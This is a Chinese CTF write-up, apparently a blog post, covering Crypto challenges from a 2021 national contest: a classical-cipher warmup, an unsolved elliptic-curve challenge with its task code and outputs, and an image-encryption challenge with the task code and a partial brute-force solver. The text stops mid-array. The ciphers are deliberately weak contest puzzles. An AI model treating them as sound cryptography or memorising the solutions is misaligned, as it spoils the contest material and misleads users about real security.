<h1 id="20210516-国赛Crypto方向部分WP"><a href="#20210516-国赛Crypto方向部分WP" class="headerlink" title="20210516 国赛Crypto方向部分WP"></a>20210516 国赛Crypto方向部分WP</h1><h2 id="【古典签到】（recuring）"><a href="#【古典签到】（recuring）" class="headerlink" title="【古典签到】（recuring）"></a>【古典签到】（recuring）</h2><p><em>做完忘记名字了</em></p>
<p>一道签到题，都是古典密码，一开始用的是ADFGX加密，<a href="https://www.dcode.fr/en">推荐这个网站，贼好用</a></p>
<p>用的是默认的那个字母表，没有keyword，但是第一步出来的没有任何含义，后面是一个栅栏一个凯撒，顺序忘了</p>
<p>我组员当时是手撕的，还拿了一血，呜呜呜，别问我为什么会有这么强的组员，也别问我为什么那么菜还可以当别人组长</p>
<h2 id="move（unsolved）"><a href="#move（unsolved）" class="headerlink" title="move（unsolved）"></a>move（unsolved）</h2><p>（没做出来，有缘再更）</p>
<h3 id="一、题目描述"><a href="#一、题目描述" class="headerlink" title="一、题目描述"></a>一、题目描述</h3><img alt="README-a01d6b78.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-a01d6b78.png" width="" height="" >

<img alt="README-5c639665.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-5c639665.png" width="" height="" >

<img alt="README-b653abcd.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-b653abcd.png" width="" height="" >
应该是用到copperSmith

<p>task.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt, gcd</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">BITS = <span class="number">512</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">nbit</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(nbit)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">3</span> == <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">nbit</span>):</span></span><br><span class="line">    p = get_prime(nbit)</span><br><span class="line">    q = get_prime(nbit)</span><br><span class="line">    <span class="keyword">if</span> q &gt; p:</span><br><span class="line">        p, q = q, p</span><br><span class="line">    n = p * q</span><br><span class="line">    bound = <span class="built_in">int</span>(sqrt(<span class="number">2</span> * n)) // <span class="number">12</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = random.randint(<span class="number">1</span>, <span class="built_in">round</span>(sqrt(bound)))</span><br><span class="line">        y = random.randint(<span class="number">1</span>, bound) // x</span><br><span class="line">        zbound = <span class="built_in">int</span>(((p - q) * <span class="built_in">round</span>(n ** <span class="number">0.25</span>) * y) // (<span class="number">3</span> * (p + q)))</span><br><span class="line">        z = zbound - ((p + <span class="number">1</span>) * (q + <span class="number">1</span>) * y + zbound) % x</span><br><span class="line">        e = ((p + <span class="number">1</span>) * (q + <span class="number">1</span>) * y + z) // x</span><br><span class="line">        <span class="keyword">if</span> gcd(e, (p + <span class="number">1</span>) * (q + <span class="number">1</span>)) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    gifts = [<span class="built_in">int</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:][:<span class="number">22</span>], <span class="number">2</span>), <span class="built_in">int</span>(<span class="built_in">bin</span>(p)[<span class="number">2</span>:][<span class="number">256</span>:<span class="number">276</span>], <span class="number">2</span>)]</span><br><span class="line">    <span class="keyword">return</span> n, e, gifts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p1, p2</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p1 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p2</span><br><span class="line">    <span class="keyword">if</span> p2 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p1</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>] <span class="keyword">and</span> (p1[<span class="number">1</span>] != p2[<span class="number">1</span>] <span class="keyword">or</span> p1[<span class="number">1</span>] == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>]:</span><br><span class="line">        tmp = (<span class="number">3</span> * p1[<span class="number">0</span>] * p1[<span class="number">0</span>]) * inverse(<span class="number">2</span> * p1[<span class="number">1</span>], n) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = (p2[<span class="number">1</span>] - p1[<span class="number">1</span>]) * inverse(p2[<span class="number">0</span>] - p1[<span class="number">0</span>], n) % n</span><br><span class="line">    x = (tmp * tmp - p1[<span class="number">0</span>] - p2[<span class="number">0</span>]) % n</span><br><span class="line">    y = (tmp * (p1[<span class="number">0</span>] - x) - p1[<span class="number">1</span>]) % n</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">int</span>(x), <span class="built_in">int</span>(y))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">n, p</span>):</span></span><br><span class="line">    r = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    tmp = p</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            r = add(r, tmp)</span><br><span class="line">        n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp, tmp)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n, e, hint = gen(BITS)</span><br><span class="line">pt = (bytes_to_long(flag[:<span class="built_in">len</span>(flag) // <span class="number">2</span>]), bytes_to_long(flag[<span class="built_in">len</span>(flag) // <span class="number">2</span>:]))</span><br><span class="line">c = mul(e, pt)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;h1 = <span class="subst">&#123;hint[<span class="number">0</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;h2 = <span class="subst">&#123;hint[<span class="number">1</span>]&#125;</span>\n&quot;</span>)</span><br><span class="line">f.write(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>\n&quot;</span>)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>output.txt</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">h1 = <span class="number">3518005</span></span><br><span class="line">h2 = <span class="number">641975</span></span><br><span class="line">c = (<span class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>, <span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span>)</span><br></pre></td></tr></table></figure>

<h3 id="二、解题思路"><a href="#二、解题思路" class="headerlink" title="二、解题思路"></a>二、解题思路</h3><p>不会了，也截止了</p>
<h2 id="imageencrypt（recuring）"><a href="#imageencrypt（recuring）" class="headerlink" title="imageencrypt（recuring）"></a>imageencrypt（recuring）</h2><p>差一点，解密的时候有点问题，贴下用到的脚本，这里只求理解，确实效率是有点低</p>
<h3 id="一、题目代码"><a href="#一、题目代码" class="headerlink" title="一、题目代码"></a>一、题目代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag,image,r,key1,key2</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(flag[:<span class="number">5</span>]==<span class="string">&#x27;CISCN&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(<span class="built_in">str</span>(r))==<span class="number">3</span>)</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,image))</span><br><span class="line"><span class="keyword">assert</span>(flag[<span class="number">6</span>:-<span class="number">1</span>] == md5.new(data).hexdigest())</span><br><span class="line"><span class="keyword">assert</span>(key1&lt;<span class="number">256</span>)</span><br><span class="line"><span class="keyword">assert</span>(key2&lt;<span class="number">256</span>)</span><br><span class="line"></span><br><span class="line">x0 = random.random()    <span class="comment"># 产生六位小数</span></span><br><span class="line">x0 = <span class="built_in">round</span>(x0,<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(r*x*(<span class="number">3</span>-x),<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">pixel,key1,key2,x0,m,n</span>):</span></span><br><span class="line">    num = m*n/<span class="number">8</span>    </span><br><span class="line">    seqs = []</span><br><span class="line">    x = x0</span><br><span class="line">    bins = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        x = generate(x)</span><br><span class="line">        tmp.append(x)</span><br><span class="line">        seqs.append(<span class="built_in">int</span>(x*<span class="number">22000</span>))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> seqs:</span><br><span class="line">        bin_x  = <span class="built_in">bin</span>(x)[<span class="number">2</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bin_x) &lt; <span class="number">16</span>:</span><br><span class="line">            bin_x = <span class="string">&#x27;0&#x27;</span>*(<span class="number">16</span>-<span class="built_in">len</span>(bin_x))+bin_x</span><br><span class="line">        bins += bin_x</span><br><span class="line">    <span class="keyword">assert</span>(<span class="built_in">len</span>(pixel) == m*n)</span><br><span class="line">    cipher = [ <span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)]   <span class="comment"># 256个零</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            index = n*i+j</span><br><span class="line">            ch = <span class="built_in">int</span>(bins[<span class="number">2</span>*index:<span class="number">2</span>*index+<span class="number">2</span>],<span class="number">2</span>)</span><br><span class="line">            pix = pixel[index]</span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">0</span>:</span><br><span class="line">                pix = (pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">1</span>:</span><br><span class="line">                pix = (~pix^key1)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">2</span>:</span><br><span class="line">                pix = (pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">            <span class="keyword">if</span> ch == <span class="number">3</span>:</span><br><span class="line">                pix = (~pix^key2)&amp;<span class="number">0xff</span></span><br><span class="line">            cipher[index] = pix</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flagimage = image</span><br><span class="line">testimage = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    testimage.append(random.randint(<span class="number">0</span>,<span class="number">255</span>))</span><br><span class="line"><span class="built_in">print</span>(testimage)</span><br><span class="line"><span class="built_in">print</span>(encrypt(testimage,key1,key2,x0,<span class="number">16</span>,<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(encrypt(flagimage,key1,key2,x0,<span class="number">24</span>,<span class="number">16</span>))</span><br></pre></td></tr></table></figure>

<h3 id="二、直接爆破"><a href="#二、直接爆破" class="headerlink" title="二、直接爆破"></a>二、直接爆破</h3><p>主要的思路就是一个一个搞，爆他，首先key1和key2好搞，现在忘了</p>
<p>然后r的话不在下面这三个数之内就没有意义了，你可以试试（你过来呀）</p>
<p>然后我的思路是最简单的爆破，有点慢，但是能出来，当时我用我们队里另外一个队员的电脑同时跑的，他从0开始，我从0.9开始哈哈哈哈哈哈哈，然后我先跑出来了，因为是0.8开始的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"></span><br><span class="line">encrypt_flagimage = [<span class="number">198</span>, <span class="number">143</span>, <span class="number">247</span>, <span class="number">3</span>, <span class="number">152</span>, <span class="number">139</span>, <span class="number">131</span>, <span class="number">84</span>, <span class="number">181</span>, <span class="number">180</span>, <span class="number">252</span>, <span class="number">177</span>, <span class="number">192</span>, <span class="number">25</span>, <span class="number">217</span>, <span class="number">179</span>, <span class="number">136</span>, <span class="number">107</span>, <span class="number">190</span>, <span class="number">62</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">90</span>, <span class="number">53</span>, <span class="number">105</span>, <span class="number">238</span>, <span class="number">117</span>, <span class="number">44</span>, <span class="number">5</span>, <span class="number">116</span>, <span class="number">132</span>, <span class="number">195</span>, <span class="number">214</span>, <span class="number">171</span>, <span class="number">113</span>, <span class="number">209</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">194</span>, <span class="number">174</span>, <span class="number">228</span>, <span class="number">212</span>, <span class="number">196</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">41</span>, <span class="number">211</span>, <span class="number">56</span>, <span class="number">139</span>, <span class="number">135</span>, <span class="number">225</span>, <span class="number">214</span>, <span class="number">89</span>, <span class="number">122</span>, <span class="number">178</span>, <span class="number">212</span>, <span class="number">185</span>, <span class="number">231</span>, <span class="number">204</span>, <span class="number">150</span>, <span class="number">204</span>, <span class="number">212</span>, <span class="number">160</span>, <span class="number">142</span>, <span class="number">213</span>, <span class="number">173</span>, <span class="number">186</span>, <span class="number">166</span>, <span class="number">65</span>, <span class="number">238</span>, <span class="number">5</span>, <span class="number">32</span>, <span class="number">45</span>, <span class="number">31</span>, <span class="number">25</span>, <span class="number">189</span>, <span class="number">148</span>, <span class="number">38</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">33</span>, <span class="number">56</span>, <span class="number">227</span>, <span class="number">48</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">31</span>, <span class="number">189</span>, <span class="number">37</span>, <span class="number">124</span>, <span class="number">106</span>, <span class="number">249</span>, <span class="number">86</span>, <span class="number">188</span>, <span class="number">86</span>, <span class="number">233</span>, <span class="number">41</span>, <span class="number">250</span>, <span class="number">89</span>, <span class="number">7</span>, <span class="number">212</span>, <span class="number">234</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">245</span>, <span class="number">102</span>, <span class="number">227</span>, <span class="number">96</span>, <span class="number">160</span>, <span class="number">67</span>, <span class="number">181</span>, <span class="number">13</span>, <span class="number">26</span>, <span class="number">192</span>, <span class="number">214</span>, <span class="number">210</span>, <span class="number">188</span>, <span class="number">84</span>, <span class="number">216</span>, <span class="number">215</span>, <span class="number">243</span>, <span class="number">72</span>, <span class="number">233</span>, <span class="number">2</span>, <span class="number">122</span>, <span class="number">166</span>, <span class="number">107</span>, <span class="number">251</span>, <span class="number">70</span>, <span class="number">128</span>, <span class="number">94</span>, <span class="number">190</span>, <span class="number">185</span>, <span class="number">210</span>, <span class="number">34</span>, <span class="number">85</span>, <span class="number">77</span>, <span class="number">29</span>, <span class="number">182</span>, <span class="number">77</span>, <span class="number">115</span>, <span class="number">208</span>, <span class="number">228</span>, <span class="number">252</span>, <span class="number">73</span>, <span class="number">198</span>, <span class="number">151</span>, <span class="number">70</span>, <span class="number">10</span>, <span class="number">97</span>, <span class="number">138</span>, <span class="number">235</span>, <span class="number">21</span>, <span class="number">117</span>, <span class="number">239</span>, <span class="number">102</span>, <span class="number">129</span>, <span class="number">2</span>, <span class="number">253</span>, <span class="number">80</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">184</span>, <span class="number">220</span>, <span class="number">41</span>, <span class="number">82</span>, <span class="number">37</span>, <span class="number">140</span>, <span class="number">23</span>, <span class="number">143</span>, <span class="number">179</span>, <span class="number">53</span>, <span class="number">153</span>, <span class="number">113</span>, <span class="number">213</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">197</span>, <span class="number">248</span>, <span class="number">65</span>, <span class="number">60</span>, <span class="number">69</span>, <span class="number">1</span>, <span class="number">81</span>, <span class="number">48</span>, <span class="number">254</span>, <span class="number">251</span>, <span class="number">89</span>, <span class="number">195</span>, <span class="number">8</span>, <span class="number">93</span>, <span class="number">190</span>, <span class="number">66</span>, <span class="number">174</span>, <span class="number">97</span>, <span class="number">175</span>, <span class="number">210</span>, <span class="number">191</span>, <span class="number">66</span>, <span class="number">112</span>, <span class="number">123</span>, <span class="number">128</span>, <span class="number">33</span>, <span class="number">230</span>, <span class="number">237</span>, <span class="number">104</span>, <span class="number">16</span>, <span class="number">192</span>, <span class="number">239</span>, <span class="number">173</span>, <span class="number">44</span>, <span class="number">10</span>, <span class="number">120</span>, <span class="number">231</span>, <span class="number">114</span>, <span class="number">151</span>, <span class="number">140</span>, <span class="number">63</span>, <span class="number">103</span>, <span class="number">44</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">242</span>, <span class="number">73</span>, <span class="number">51</span>, <span class="number">46</span>, <span class="number">98</span>, <span class="number">137</span>, <span class="number">163</span>, <span class="number">152</span>, <span class="number">147</span>, <span class="number">95</span>, <span class="number">223</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">112</span>, <span class="number">85</span>, <span class="number">215</span>, <span class="number">133</span>, <span class="number">131</span>, <span class="number">240</span>, <span class="number">239</span>, <span class="number">224</span>, <span class="number">195</span>, <span class="number">140</span>, <span class="number">124</span>, <span class="number">70</span>, <span class="number">156</span>, <span class="number">221</span>, <span class="number">241</span>, <span class="number">37</span>, <span class="number">245</span>, <span class="number">1</span>, <span class="number">99</span>, <span class="number">9</span>, <span class="number">157</span>, <span class="number">99</span>, <span class="number">150</span>, <span class="number">47</span>, <span class="number">118</span>, <span class="number">225</span>, <span class="number">16</span>, <span class="number">13</span>, <span class="number">141</span>, <span class="number">135</span>, <span class="number">99</span>, <span class="number">18</span>, <span class="number">119</span>, <span class="number">63</span>, <span class="number">160</span>, <span class="number">6</span>, <span class="number">247</span>, <span class="number">27</span>, <span class="number">68</span>, <span class="number">45</span>, <span class="number">199</span>, <span class="number">86</span>, <span class="number">193</span>, <span class="number">252</span>, <span class="number">21</span>, <span class="number">135</span>, <span class="number">32</span>, <span class="number">42</span>, <span class="number">103</span>, <span class="number">114</span>, <span class="number">241</span>, <span class="number">49</span>, <span class="number">249</span>, <span class="number">182</span>, <span class="number">52</span>, <span class="number">18</span>, <span class="number">155</span>, <span class="number">157</span>, <span class="number">61</span>, <span class="number">4</span>, <span class="number">246</span>, <span class="number">158</span>, <span class="number">52</span>, <span class="number">118</span>, <span class="number">242</span>, <span class="number">195</span>, <span class="number">54</span>, <span class="number">139</span>, <span class="number">232</span>, <span class="number">100</span>, <span class="number">31</span>, <span class="number">11</span>, <span class="number">233</span>, <span class="number">58</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">137</span>, <span class="number">83</span>, <span class="number">145</span>, <span class="number">209</span>, <span class="number">7</span>, <span class="number">241</span>, <span class="number">96</span>, <span class="number">57</span>, <span class="number">148</span>, <span class="number">207</span>, <span class="number">29</span>, <span class="number">237</span>, <span class="number">124</span>, <span class="number">177</span>, <span class="number">166</span>, <span class="number">161</span>, <span class="number">20</span>, <span class="number">116</span>, <span class="number">122</span>, <span class="number">61</span>, <span class="number">71</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">157</span>, <span class="number">253</span>, <span class="number">130</span>, <span class="number">112</span>, <span class="number">66</span>, <span class="number">94</span>, <span class="number">57</span>, <span class="number">221</span>, <span class="number">243</span>, <span class="number">222</span>, <span class="number">192</span>, <span class="number">147</span>, <span class="number">5</span>, <span class="number">130</span>, <span class="number">201</span>, <span class="number">174</span>, <span class="number">26</span>, <span class="number">160</span>, <span class="number">16</span>, <span class="number">188</span>, <span class="number">103</span>, <span class="number">187</span>, <span class="number">11</span>, <span class="number">238</span>, <span class="number">182</span>, <span class="number">144</span>, <span class="number">4</span>, <span class="number">137</span>, <span class="number">33</span>, <span class="number">84</span>, <span class="number">100</span>, <span class="number">7</span>, <span class="number">239</span>, <span class="number">219</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">189</span>, <span class="number">166</span>, <span class="number">58</span>, <span class="number">93</span>, <span class="number">141</span>, <span class="number">30</span>, <span class="number">198</span>, <span class="number">220</span>, <span class="number">196</span>, <span class="number">118</span>, <span class="number">172</span>, <span class="number">5</span>, <span class="number">45</span>]</span><br><span class="line"></span><br><span class="line">testimage = [<span class="number">205</span>, <span class="number">237</span>, <span class="number">6</span>, <span class="number">158</span>, <span class="number">24</span>, <span class="number">119</span>, <span class="number">213</span>, <span class="number">32</span>, <span class="number">74</span>, <span class="number">151</span>, <span class="number">142</span>, <span class="number">186</span>, <span class="number">57</span>, <span class="number">28</span>, <span class="number">113</span>, <span class="number">62</span>, <span class="number">165</span>, <span class="number">20</span>, <span class="number">190</span>, <span class="number">37</span>, <span class="number">159</span>, <span class="number">137</span>, <span class="number">196</span>, <span class="number">44</span>, <span class="number">97</span>, <span class="number">37</span>, <span class="number">7</span>, <span class="number">222</span>, <span class="number">220</span>, <span class="number">95</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">199</span>, <span class="number">142</span>, <span class="number">95</span>, <span class="number">105</span>, <span class="number">119</span>, <span class="number">232</span>, <span class="number">250</span>, <span class="number">215</span>, <span class="number">60</span>, <span class="number">162</span>, <span class="number">91</span>, <span class="number">211</span>, <span class="number">63</span>, <span class="number">30</span>, <span class="number">91</span>, <span class="number">108</span>, <span class="number">217</span>, <span class="number">206</span>, <span class="number">80</span>, <span class="number">193</span>, <span class="number">230</span>, <span class="number">42</span>, <span class="number">221</span>, <span class="number">71</span>, <span class="number">136</span>, <span class="number">115</span>, <span class="number">22</span>, <span class="number">176</span>, <span class="number">91</span>, <span class="number">57</span>, <span class="number">61</span>, <span class="number">3</span>, <span class="number">87</span>, <span class="number">73</span>, <span class="number">250</span>, <span class="number">121</span>, <span class="number">51</span>, <span class="number">72</span>, <span class="number">83</span>, <span class="number">120</span>, <span class="number">77</span>, <span class="number">199</span>, <span class="number">236</span>, <span class="number">190</span>, <span class="number">249</span>, <span class="number">116</span>, <span class="number">45</span>, <span class="number">6</span>, <span class="number">134</span>, <span class="number">110</span>, <span class="number">149</span>, <span class="number">94</span>, <span class="number">214</span>, <span class="number">232</span>, <span class="number">153</span>, <span class="number">213</span>, <span class="number">119</span>, <span class="number">98</span>, <span class="number">81</span>, <span class="number">203</span>, <span class="number">240</span>, <span class="number">114</span>, <span class="number">240</span>, <span class="number">29</span>, <span class="number">122</span>, <span class="number">188</span>, <span class="number">156</span>, <span class="number">53</span>, <span class="number">128</span>, <span class="number">185</span>, <span class="number">40</span>, <span class="number">147</span>, <span class="number">245</span>, <span class="number">204</span>, <span class="number">47</span>, <span class="number">101</span>, <span class="number">80</span>, <span class="number">229</span>, <span class="number">41</span>, <span class="number">150</span>, <span class="number">28</span>, <span class="number">195</span>, <span class="number">25</span>, <span class="number">235</span>, <span class="number">119</span>, <span class="number">6</span>, <span class="number">192</span>, <span class="number">8</span>, <span class="number">73</span>, <span class="number">255</span>, <span class="number">159</span>, <span class="number">172</span>, <span class="number">77</span>, <span class="number">94</span>, <span class="number">254</span>, <span class="number">104</span>, <span class="number">236</span>, <span class="number">219</span>, <span class="number">141</span>, <span class="number">91</span>, <span class="number">195</span>, <span class="number">162</span>, <span class="number">97</span>, <span class="number">56</span>, <span class="number">252</span>, <span class="number">173</span>, <span class="number">163</span>, <span class="number">43</span>, <span class="number">167</span>, <span class="number">214</span>, <span class="number">50</span>, <span class="number">73</span>, <span class="number">115</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">53</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">138</span>, <span class="number">192</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">190</span>, <span class="number">27</span>, <span class="number">37</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">135</span>, <span class="number">90</span>, <span class="number">215</span>, <span class="number">106</span>, <span class="number">243</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">143</span>, <span class="number">150</span>, <span class="number">185</span>, <span class="number">142</span>, <span class="number">192</span>, <span class="number">176</span>, <span class="number">48</span>, <span class="number">138</span>, <span class="number">164</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">77</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">203</span>, <span class="number">210</span>, <span class="number">71</span>, <span class="number">186</span>, <span class="number">49</span>, <span class="number">162</span>, <span class="number">250</span>, <span class="number">218</span>, <span class="number">219</span>, <span class="number">195</span>, <span class="number">63</span>, <span class="number">248</span>, <span class="number">220</span>, <span class="number">155</span>, <span class="number">180</span>, <span class="number">219</span>, <span class="number">132</span>, <span class="number">219</span>, <span class="number">94</span>, <span class="number">144</span>, <span class="number">247</span>, <span class="number">211</span>, <span class="number">95</span>, <span class="number">70</span>, <span class="number">227</span>, <span class="number">222</span>, <span class="number">31</span>, <span class="number">69</span>, <span class="number">24</span>, <span class="number">13</span>, <span class="number">216</span>, <span class="number">185</span>, <span class="number">108</span>, <span class="number">137</span>, <span class="number">57</span>, <span class="number">186</span>, <span class="number">211</span>, <span class="number">55</span>, <span class="number">27</span>, <span class="number">158</span>, <span class="number">241</span>, <span class="number">223</span>, <span class="number">21</span>, <span class="number">134</span>, <span class="number">106</span>, <span class="number">152</span>, <span class="number">127</span>, <span class="number">187</span>, <span class="number">245</span>, <span class="number">246</span>, <span class="number">131</span>, <span class="number">176</span>, <span class="number">177</span>, <span class="number">228</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">11</span>, <span class="number">84</span>, <span class="number">61</span>, <span class="number">193</span>, <span class="number">42</span>, <span class="number">41</span>, <span class="number">69</span>, <span class="number">229</span>, <span class="number">145</span>, <span class="number">254</span>, <span class="number">138</span>, <span class="number">3</span>, <span class="number">153</span>, <span class="number">123</span>, <span class="number">31</span>]</span><br><span class="line"></span><br><span class="line">encrypt_testimage = [<span class="number">131</span>, <span class="number">92</span>, <span class="number">72</span>, <span class="number">47</span>, <span class="number">177</span>, <span class="number">57</span>, <span class="number">131</span>, <span class="number">118</span>, <span class="number">4</span>, <span class="number">38</span>, <span class="number">192</span>, <span class="number">19</span>, <span class="number">119</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">143</span>, <span class="number">235</span>, <span class="number">165</span>, <span class="number">15</span>, <span class="number">140</span>, <span class="number">209</span>, <span class="number">223</span>, <span class="number">117</span>, <span class="number">133</span>, <span class="number">47</span>, <span class="number">148</span>, <span class="number">81</span>, <span class="number">144</span>, <span class="number">138</span>, <span class="number">246</span>, <span class="number">173</span>, <span class="number">235</span>, <span class="number">177</span>, <span class="number">181</span>, <span class="number">110</span>, <span class="number">39</span>, <span class="number">9</span>, <span class="number">192</span>, <span class="number">57</span>, <span class="number">166</span>, <span class="number">180</span>, <span class="number">153</span>, <span class="number">141</span>, <span class="number">19</span>, <span class="number">234</span>, <span class="number">157</span>, <span class="number">142</span>, <span class="number">80</span>, <span class="number">234</span>, <span class="number">197</span>, <span class="number">151</span>, <span class="number">152</span>, <span class="number">249</span>, <span class="number">143</span>, <span class="number">176</span>, <span class="number">155</span>, <span class="number">147</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">194</span>, <span class="number">191</span>, <span class="number">254</span>, <span class="number">13</span>, <span class="number">144</span>, <span 